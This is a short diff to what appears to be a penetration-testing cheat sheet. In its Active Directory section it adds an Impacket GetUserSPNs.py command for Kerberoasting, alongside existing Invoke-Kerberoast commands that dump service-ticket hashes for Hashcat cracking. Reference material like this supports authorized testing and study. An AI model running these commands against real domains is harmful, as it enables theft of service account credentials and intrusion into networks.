@@ -778,6 +778,7 @@ Active Directory
          Invoke-Kerberoast in powerview  
          Invoke-Kerberoast -OutputFormat Hashcat | Select-Object Hash | Out-File -filepath 'c:\temp\hashcapture.txt' -width 8000
          https://github.com/skelsec/kerberoast
+         GetUserSPNs.py -request -dc-ip <RHOST> <domain>/<user>  
          
 <br>
 
